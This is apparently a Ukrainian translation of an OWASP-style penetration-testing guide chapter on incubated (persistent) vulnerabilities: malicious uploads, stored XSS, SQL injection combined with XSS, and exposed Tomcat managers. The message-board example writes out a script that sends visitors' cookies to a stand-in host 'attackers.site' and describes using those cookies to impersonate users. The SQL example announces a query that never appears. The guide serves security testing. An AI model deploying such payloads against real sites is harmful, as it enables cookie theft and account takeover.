# Тестування на інкубовану вразливість
## Висновок

Інкубоване тестування, яке також часто називають персистентними атаками, є складним методом тестування, для роботи якого потрібно більше однієї вразливості з перевіркою даних. Інкубовані вразливості зазвичай використовуються для проведення атак типу "водопій" проти користувачів легітимних веб-додатків.

Інкубовані уразливості мають наступні характеристики:

По-перше, вектор атаки повинен бути збережений, він повинен зберігатися в шарі збереження, а це можливо лише за наявності слабкої валідації даних або якщо дані надійшли в систему через інший канал, наприклад, через консоль адміністратора або безпосередньо через внутрішній пакетний процес.
По-друге, після того, як вектор атаки був "викликаний", він повинен бути успішно виконаний. Наприклад, інкубована XSS-атака вимагатиме слабкої перевірки вихідних даних, тому скрипт буде доставлений клієнту у виконуваному вигляді.
Використання деяких вразливостей або навіть функціональних особливостей веб-додатку дозволить зловмиснику підкинути фрагмент даних, який згодом буде отриманий нічого не підозрюючим користувачем або іншим компонентом системи, експлуатуючи певну вразливість там.

У тесті на проникнення інкубовані атаки можуть бути використані для оцінки критичності певних помилок, використовуючи знайдену проблему безпеки для побудови атаки на стороні клієнта, яка зазвичай буде спрямована на велику кількість жертв одночасно (тобто на всіх користувачів, які переглядають сайт).

Цей тип асинхронної атаки охоплює широкий спектр векторів атаки, серед яких можна виділити наступні:

- Компоненти завантаження файлів у веб-додатку, що дозволяють зловмиснику завантажувати пошкоджені медіа-файли (JPEG-зображення, що експлуатують CVE-2004-0200, PNG-зображення, що експлуатують CVE-2004-0597, виконувані файли, сторінки сайту з активним компонентом і т.д.)
- Проблеми міжсайтового скриптингу в повідомленнях на публічних форумах (більш детально див. Тестування на наявність збереженого міжсайтового скриптингу). Потенційно зловмисник може зберігати шкідливі скрипти або код в репозиторії у внутрішній частині веб-додатку (наприклад, в базі даних) для того, щоб цей скрипт/код виконувався одним з користувачів (кінцевими користувачами, адміністраторами тощо). Прикладом архетипової інкубованої атаки є використання міжсайтової скриптової уразливості на форумі користувача, дошці оголошень або блозі з метою впровадження деякого JavaScript коду на вразливій сторінці, який в кінцевому підсумку буде відображений і виконаний в браузері користувача сайту - з використанням рівня довіри до оригінального (вразливого) сайту в браузері користувача.
- SQL/XPATH Ін'єкція, що дозволяє зловмиснику завантажити контент в базу даних, який пізніше буде отриманий як частина активного контенту на веб-сторінці. Наприклад, якщо зловмисник може розмістити довільний JavaScript на дошці оголошень так, щоб він виконувався користувачами, то він може отримати контроль над їх браузерами (наприклад, XSS-проксі).
- Неправильно налаштовані сервери, що дозволяють встановлювати пакети Java або подібні компоненти веб-сайтів (наприклад, Tomcat, або консолі веб-хостингу, такі як Plesk, CPanel, Helm і т.д.).

## Об'єкти тестування
- Ідентифікувати ін'єкції, які зберігаються і потребують етапу відкликання до збереженої ін'єкції.
- Зрозуміти, як може відбутися етап виклику.
- Якщо можливо, встановити слухачів або активувати крок відкликання.

## Як протестувати
### Тестування "чорної скриньки"
#### Приклад завантаження файлів
Перевірте тип контенту, дозволений для завантаження у веб-додаток, та отриману URL-адресу для завантаженого файлу. Завантажте файл, який буде експлуатувати компонент на локальній робочій станції користувача при перегляді або завантаженні користувачем. Надіслати жертві електронний лист або інший вид оповіщення, щоб змусити його/її переглянути сторінку. Очікуваний результат - експлойт спрацює, коли користувач перегляне отриману сторінку або завантажить і запустить файл з довіреного сайту.

#### Приклад XSS на дошці оголошень
- Ввести код JavaScript в якості значення вразливого поля, наприклад, <script>document.write('<img src="http://attackers.site/cv.jpg?'+document.cookie+'">')</script></script>.
- Спрямувати користувачів на перегляд вразливої сторінки або дочекатися, поки вони її переглянуть. На хості attackers.site встановіть "слухач", що прослуховує всі вхідні з'єднання.
- Коли користувачі переглядають вразливу сторінку, на хост attackers.site буде відправлений запит, що містить їх cookie (document.cookie включений як частина запитуваної URL-адреси), наприклад GET /cv.jpg?SignOn=COOKIEVALUE1;%20ASPSESSIONID=ROGUEIDVALUE; HTTP/1.1
- Використання отриманих файлів cookie для видачі себе за користувачів на вразливому сайті.

#### Приклад SQL ін'єкції
Зазвичай, цей набір прикладів використовує XSS-атаки шляхом використання SQL-ін'єкцій. Перше, що потрібно перевірити - чи є на цільовому сайті уразливість SQL-ін'єкції. Це описано в розділі Тестування на наявність SQL-ін'єкцій. Для кожної SQL-ін'єкції існує базовий набір обмежень, що описує тип запитів, які дозволені зловмиснику/тестеру.

Потім тестувальник повинен зіставити розроблені ним XSS-атаки з записами, які йому дозволено вставляти.

Так само, як і в попередньому прикладі XSS, використовуйте поле веб-сторінки, вразливе до SQL-ін'єкцій, щоб змінити значення в базі даних, яке буде використовуватися додатком в якості вхідних даних для відображення на сайті без належної фільтрації (це буде комбінація SQL-ін'єкції та XSS-атаки). Наприклад, припустимо, що в базі даних є таблиця нижнього колонтитула з усіма колонтитулами для сторінок веб-сайту, включаючи поле повідомлення з юридичним повідомленням, яке з'являється внизу кожної веб-сторінки. Ви можете використовувати наступний запит, щоб вставити код JavaScript в поле повідомлення в таблиці нижнього колонтитула в базі даних.


#### Неправильно налаштований сервер
Деякі веб-сервери мають інтерфейс адміністрування, який може дозволити зловмиснику завантажити на сайт активні компоненти на свій вибір. Це може бути у випадку з сервером Apache Tomcat, який не вимагає надійних облікових даних для доступу до свого менеджера веб-додатків (або якщо тестувальники змогли отримати дійсні облікові дані для модуля адміністрування іншими способами).

У цьому випадку можна завантажити WAR-файл і розгорнути на сайті новий веб-додаток, що дозволить не тільки виконати обраний тестувальником код локально на сервері, але й розмістити на довіреному сайті додаток, до якого потім зможуть отримати доступ звичайні користувачі сайту (швидше за все, з більш високим ступенем довіри, ніж при зверненні до іншого сайту).

Очевидно, що можливість змінювати вміст веб-сторінок на сервері через будь-які вразливості, які можуть бути використані на хості, що дасть зловмиснику права на запис у кореневому каталозі, також буде корисною для розміщення такої інкубованої атаки на сторінках веб-сервера (насправді, це відомий метод розповсюдження інфекції для деяких веб-серверних черв'яків).


### Тестування "сірої скриньки"
Методи тестування "сірої" та "білої" скриньок будуть такими ж, як і раніше.

- Вивчення перевірки вхідних даних є ключовим у зменшенні цієї вразливості. Якщо інші системи на підприємстві використовують той самий рівень збереження, вони можуть мати слабку перевірку вхідних даних, і дані можуть зберігатися через обхідні шляхи.
- Для боротьби з проблемою "чорного ходу" для атак на стороні клієнта необхідно також використовувати перевірку вихідних даних, щоб зіпсовані дані кодувалися перед відображенням клієнту, а отже, не виконувалися.

## Інструменти
- [XSS-proxy](https://sourceforge.net/projects/xss-proxy/)
- [OWASP Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)
- [Burp Suite](https://portswigger.net/burp)
- [Metasploit](https://www.metasploit.com/)

